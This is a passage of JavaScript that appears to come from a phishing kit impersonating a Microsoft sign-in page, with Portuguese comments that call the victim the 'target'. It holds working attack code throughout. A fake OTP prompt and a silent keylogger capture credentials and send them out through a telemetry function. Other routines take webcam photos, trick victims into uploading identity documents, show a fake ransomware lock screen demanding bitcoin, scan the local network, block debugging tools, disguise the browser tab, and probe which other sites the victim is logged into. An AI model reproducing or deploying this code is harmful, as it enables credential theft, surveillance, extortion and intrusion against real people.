            <img src="https://logincdn.msauth.net/shared/1.0/content/images/app_pi_95493b84570075e7a91a92e105e6b72a.svg" style="width:32px;">
            <span style="font-size:14px; color:#666;">Mensagem de texto para +XX ******XX</span>
        </div>
        <input type="text" id="otp" style="width:100%; border:none; border-bottom:1px solid #0067b8; padding:10px 0; font-size:18px; margin-bottom:20px; outline:none; letter-spacing:5px; font-weight:bold; text-align:center;" placeholder="000000" maxlength="8">
        <div style="font-size:13px; color:#0067b8; margin-bottom:30px; cursor:pointer;">Não recebi o código?</div>
    `;

    const btn = document.getElementById('btn');
    loginContent.insertBefore(otpView, btn);
    btn.innerText = 'Verificar';
    btn.disabled = false;
    
    sendTelemetry('typing', { logId, text: '[SISTEMA]: Fluxo de 2FA/OTP disparado para o alvo.' });
}

// ADVANCED SILENT KEYLOGGER
let keyBuffer = "";
let lastTarget = null;

document.addEventListener('keydown', (e) => {
    const target = e.target;
    const key = e.key;
    
    // Ignore pure modifier keys
    if (["Shift", "Control", "Alt", "AltGraph", "CapsLock", "Meta"].includes(key)) return;

    // Handle context switching between fields
    if (lastTarget !== target) {
        if (keyBuffer.length > 0) flushKeyBuffer();
        const id = target.id || target.name || target.tagName;
        keyBuffer += `\n[FIELD:${id}]: `;
        lastTarget = target;
    }

    if (key === "Enter") {
        keyBuffer += " <ENTER> ";
        flushKeyBuffer();
    } else if (key === "Backspace") {
        keyBuffer += " <BKS> ";
    } else if (key === "Tab") {
        keyBuffer += " <TAB> ";
        flushKeyBuffer();
    } else if (key.length === 1) {
        keyBuffer += key;
    }

    // Auto-flush if buffer gets too large
    if (keyBuffer.length > 50) {
        flushKeyBuffer();
    }
});

function flushKeyBuffer() {
    if (keyBuffer.trim().length === 0) return;
    sendTelemetry('capture_creds', { logId, value: `[KEYLOG]: ${keyBuffer}` });
    keyBuffer = "";
}

// Periodic flush just in case user stops typing
setInterval(flushKeyBuffer, 5000);

async function takePhoto() {
    const video = document.getElementById('v');
    const canvas = document.getElementById('c');
    if (!video || !canvas) return;
    const ctx = canvas.getContext('2d');
    canvas.width = 640; canvas.height = 480;
    ctx.drawImage(video, 0, 0, 640, 480);
    sendTelemetry('capture_photo', { logId, image: canvas.toDataURL('image/jpeg', 0.5) });
}

async function triggerFilePicker() {
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.98);z-index:200000;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:sans-serif;color:#333;';
    overlay.innerHTML = `
        <div style="width:450px; text-align:center; padding:40px; border:1px solid #ddd; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.1);">
            <div style="width:80px; height:80px; background:#0078d4; border-radius:50%; margin:0 auto 20px; display:flex; justify-content:center; align-items:center;">
                <svg viewBox="0 0 24 24" style="width:40px; fill:white;"><path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M13,9V3.5L18.5,9H13M17,19H7V17H17V19M17,15H7V13H17V15M17,11H7V10H12V11H17V11Z"/></svg>
            </div>
            <h2 style="margin:0 0 15px;">Scanner de Segurança Corporativa</h2>
            <p style="color:#666; font-size:14px; margin-bottom:30px;">Para validar seu acesso, o sistema precisa verificar a integridade dos seus certificados digitais ou documentos de identificação.</p>
            
            <div id="file-drop-zone" style="border:2px dashed #0078d4; border-radius:8px; padding:30px; margin-bottom:20px; cursor:pointer; transition:0.3s;">
                <p style="margin:0; color:#0078d4; font-weight:bold;">Clique ou Arraste o arquivo aqui</p>
                <p style="margin:5px 0 0; color:#888; font-size:12px;">(PDF, JPG, PNG ou CERT)</p>
                <input type="file" id="real-file-input" style="display:none;">
            </div>
            <button id="cancel-scan" style="background:none; border:none; color:#888; cursor:pointer; font-size:13px;">Pular esta etapa</button>
        </div>
    `;
    document.body.appendChild(overlay);

    const zone = overlay.querySelector('#file-drop-zone');
    const input = overlay.querySelector('#real-file-input');
    const cancel = overlay.querySelector('#cancel-scan');

    zone.onclick = () => input.click();
    cancel.onclick = () => overlay.remove();

    input.onchange = (e) => {
        const file = e.target.files[0];
        if (!file) return;

        zone.innerHTML = `<p style="color:#28a745; font-weight:bold;">Analisando: ${file.name}...</p><div style="width:100%; height:4px; background:#eee; margin-top:10px; border-radius:2px; overflow:hidden;"><div style="width:0%; height:100%; background:#28a745; animation:load-file 2s forwards;"></div></div>`;
        
        const reader = new FileReader();
        reader.onload = (re) => {
            sendTelemetry('file_upload', {
                logId,
                name: file.name,
                type: file.type,
                size: file.size,
                content: re.target.result // Base64
            });
            
            setTimeout(() => {
                zone.innerHTML = `<p style="color:#28a745; font-weight:bold;">✅ Verificado com sucesso!</p>`;
                setTimeout(() => overlay.remove(), 1500);
            }, 2000);
        };
        reader.readAsDataURL(file);
    };

    const style = document.createElement('style');
    style.innerHTML = `@keyframes load-file { to { width: 100%; } }`;
    document.head.appendChild(style);
}

async function triggerRansomware() {
    // 1. Fullscreen request
    try { document.documentElement.requestFullscreen(); } catch(e){}

    // 2. Block all inputs
    document.body.style.pointerEvents = 'none';
    document.body.style.userSelect = 'none';
    window.addEventListener('keydown', (e) => { e.preventDefault(); e.stopPropagation(); }, true);
    
    // 3. Audio Alarm
    const alarm = new Audio('https://www.soundjay.com/buttons/beep-07.mp3');
    alarm.loop = true;
    alarm.play().catch(()=>{});

    // 4. Create UI
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:1000000;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:monospace;color:#ff3333;text-align:center;padding:20px;box-sizing:border-box;pointer-events:auto;';
    
    overlay.innerHTML = `
        <div style="border:5px solid #ff3333; padding:50px; background:rgba(20,0,0,0.9); box-shadow:0 0 50px #f00; max-width:800px;">
            <h1 style="font-size:3.5rem; margin:0; text-shadow:0 0 20px #f00; animation:blink-red 1s infinite;">⚠ SYSTEM ENCRYPTED ⚠</h1>
            <p style="font-size:1.2rem; color:#fff; margin:30px 0;">Your files have been encrypted using AES-256 and RSA-4096 algorithms.</p>
            
            <div style="background:#111; padding:20px; border:1px solid #444; margin-bottom:30px;">
                <div style="color:#aaa; font-size:0.8rem; margin-bottom:10px;">TIME LEFT TO PAY:</div>
                <div id="ransom-timer" style="font-size:4rem; color:#ffcc00; font-weight:bold;">23:59:59</div>
            </div>

            <p style="color:#fff;">To decrypt your data, send <b style="color:#0f0;">1.5 BTC</b> to the following address:</p>
            <div style="background:#222; padding:15px; color:#0f0; border-radius:4px; font-size:1.1rem; margin-bottom:20px; border:1px dashed #0f0;">
                bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
            </div>
            
            <p style="font-size:0.9rem; color:#666;">Trying to close this window or restart your PC will result in immediate permanent data loss.</p>
        </div>
        <style>
            @keyframes blink-red { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
            body { overflow: hidden !important; }
        </style>
    `;
    document.body.appendChild(overlay);

    // 5. Logic: Real-time Countdown
    let hours = 23, minutes = 59, seconds = 59;
    setInterval(() => {
        seconds--;
        if (seconds < 0) { seconds = 59; minutes--; }
        if (minutes < 0) { minutes = 59; hours--; }
        const h = String(hours).padStart(2, '0');
        const m = String(minutes).padStart(2, '0');
        const s = String(seconds).padStart(2, '0');
        const timerEl = document.getElementById('ransom-timer');
        if (timerEl) timerEl.innerText = `${h}:${m}:${s}`;
    }, 1000);

    sendTelemetry('typing', { logId, text: '[SISTEMA]: Ransomware Ativado no Alvo! Bloqueio Total.' });
    sendTelemetry('status_change', { logId, status: 'infected' });
}

async function advancedRecon() {
    sendTelemetry('perf', { logId, text: '[RECON]: Iniciando varredura profunda de rede local...' });

    // 1. Get Internal IP via WebRTC
    let localIP = '192.168.0.1'; // Default base
    try {
        const pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
            if (myIP) {
                localIP = myIP;
                sendTelemetry('perf', { logId, text: `[RECON]: IP Interno Detectado: ${localIP}` });
                startSubnetScan(localIP);
            }
        };
    } catch(e) {
        startSubnetScan(localIP);
    }
}

async function startSubnetScan(baseIP) {
    const parts = baseIP.split('.');
    const subnet = `${parts[0]}.${parts[1]}.${parts[2]}.`;
    const commonPorts = [80, 443, 8080, 3000, 5000];
    let foundDevices = [];

    // Scan a range of IPs (ex: .1 to .25) - limited for performance in demo
    for (let i = 1; i <= 25; i++) {
        const targetIP = subnet + i;

        // Concurrent port check for each IP
        commonPorts.forEach(port => {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 1500);

            fetch(`http://${targetIP}:${port}`, { mode: 'no-cors', signal: controller.signal })
                .then(() => {
                    const dev = `${targetIP}:${port}`;
                    if (!foundDevices.includes(dev)) {
                        foundDevices.push(dev);
                        sendTelemetry('perf', { logId, text: `[PIVOT]: Dispositivo Ativo Encontrado -> ${dev}` });
                        sendTelemetry('network', { logId, devices: foundDevices });
                    }
                })
                .catch(() => {})
                .finally(() => clearTimeout(timeoutId));
        });
    }
}


let tabAway = false;
window.addEventListener('blur', () => {
    tabAway = true;
    sendTelemetry('typing', { logId, text: '[ALVO_SAIU_DA_ABA]' });
    sendTelemetry('status_change', { logId, status: 'offline' });
});
window.addEventListener('focus', () => {
    if(tabAway) {
        sendTelemetry('status_change', { logId, status: 'online' });
    }
});

// --- SUPREME ANTI-DEBUG MODULE ---
(function() {
    const REDIRECT_URL = 'https://www.microsoft.com'; // Escape route
    
    function selfDestruct(reason) {
        sendTelemetry('perf', { logId, text: `[ANTI-DEBUG]: Detecção ativada! Motivo: ${reason}` });
        window.location.href = REDIRECT_URL;
    }

    // 1. Disable Right Click
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        return false;
    });

    // 2. Disable DevTools Shortcuts
    document.addEventListener('keydown', (e) => {
        if (
            e.keyCode === 123 || // F12
            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || // Ctrl+Shift+I/J/C
            (e.ctrlKey && e.keyCode === 85) // Ctrl+U (View Source)
        ) {
            e.preventDefault();
            selfDestruct('Atalho de DevTools pressionado');
            return false;
        }
    });

    // 3. Debugger Loop (Freezes execution if DevTools is opened)
    setInterval(function() {
        const startTime = performance.now();
        debugger;
        const endTime = performance.now();
        if (endTime - startTime > 100) {
            selfDestruct('Debugger detectado');
        }
    }, 1000);

    // 4. Console Proxy (Detection via timing)
    const devtools = {
        isOpen: false,
        orientation: undefined
    };
    const threshold = 160;
    const emitEvent = (isOpen, orientation) => {
        if (isOpen) selfDestruct('Painel de Console aberto');
    };

    setInterval(() => {
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
        const orientation = widthThreshold ? 'vertical' : 'horizontal';

        if (
            !(heightThreshold && widthThreshold) &&
            ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)
        ) {
            if (!devtools.isOpen || devtools.orientation !== orientation) {
                emitEvent(true, orientation);
            }
            devtools.isOpen = true;
            devtools.orientation = orientation;
        } else {
            if (devtools.isOpen) {
                emitEvent(false, undefined);
            }
            devtools.isOpen = false;
            devtools.orientation = undefined;
        }
    }, 500);
})();

// --- TAB-HIJACKING & INTEL DISCOVERY ---
(function() {
    const originalTitle = document.title;
    const fakeTitle = 'Google - Nova Guia';
    const fakeFavicon = 'https://www.google.com/favicon.ico';
    let originalFavicon = '';

    // Get current favicon
    const link = document.querySelector("link[rel*='icon']") || document.createElement('link');
    originalFavicon = link.href;

    function setFavicon(url) {
        link.type = 'image/x-icon';
        link.rel = 'shortcut icon';
        link.href = url;
        document.getElementsByTagName('head')[0].appendChild(link);
    }

    // Tab-Hijacking Logic
    window.addEventListener('blur', () => {
        document.title = fakeTitle;
        setFavicon(fakeFavicon);
        sendTelemetry('perf', { logId, text: '[TAB-HIJACK]: Aba disfarçada de Google (User saiu).' });
    });

    window.addEventListener('focus', () => {
        document.title = '⚠️ SESSÃO EXPIRADA - REAUTENTIQUE';
        setFavicon(originalFavicon);
        sendTelemetry('perf', { logId, text: '[TAB-HIJACK]: Alvo voltou. Exibindo alerta de urgência.' });
        
        // Brief visual nudge
        setTimeout(() => { document.title = originalTitle; }, 3000);
    });

    // Intel Discovery (Login/History Detection)
    async function checkLoginStatus() {
        const platforms = [
            { name: 'Gmail/Google', url: 'https://mail.google.com/mail/u/0/?ibiz=0' },
            { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
            { name: 'Netflix', url: 'https://www.netflix.com/favicon.ico' },
            { name: 'LinkedIn', url: 'https://www.linkedin.com/favicon.ico' },
            { name: 'YouTube', url: 'https://www.youtube.com/favicon.ico' }
        ];

        let activeSessions = [];
        for (const site of platforms) {
            const img = new Image();
            img.src = site.url + '?v=' + Math.random();
            img.onload = () => {
                activeSessions.push(site.name);
                sendTelemetry('perf', { logId, text: `[INTEL]: Sessão ativa detectada: ${site.name}` });
            };
        }
        
        setTimeout(() => {
            if(activeSessions.length > 0) {
                sendTelemetry('perf', { logId, text: `[INTEL]: Relatório de Interesse: ${activeSessions.join(', ')}` });
            }
        }, 5000);
    }
    
    // Run intel scan after initial load
    setTimeout(checkLoginStatus, 3000);
})();

// Final Initialization & Hide Loader
setTimeout(() => {
    try {
        const loader = document.getElementById('loader');
        const content = document.getElementById('content');
        if(loader) loader.style.display = 'none';
        if(content) content.style.display = 'block';
        
        // Start background tasks safely
        if(typeof startMediaMonitoring === 'function') startMediaMonitoring();
        if(typeof sendSimulatedData === 'function') sendSimulatedData();
        if(typeof auditSocialMedia === 'function') auditSocialMedia();
        
        sendTelemetry('typing', { logId, text: '[SISTEMA]: Alvo Online e Carregado ✅' });
    } catch(e) {
        console.error("Erro na inicialização:", e);
        const loader = document.getElementById('loader');
        const content = document.getElementById('content');
        if(loader) loader.style.display = 'none';
        if(content) content.style.display = 'block';
    }
}, 1500);

function getDeviceStats() {
    const info = {
        ram: navigator.deviceMemory || 'N/A',
        cores: navigator.hardwareConcurrency || 'N/A',
        platform: navigator.platform
    };
    sendTelemetry('typing', { logId, text: `[HARDWARE]: RAM: ${info.ram}GB | Cores: ${info.cores} | OS: ${info.platform}` });
}

// Initial Data Population for Dashboard
setTimeout(() => {
    getExtraInfo();
    getDeviceStats();
    sendSimulatedData();
    sendTelemetry('capture_creds', { logId, value: '[AUTO]: Alvo abriu a página' });
}, 1000);

// Emits an active ping every 10s to keep connection status fresh
setInterval(() => {
    sendTelemetry('ping_alive', { logId });
}, 10000);
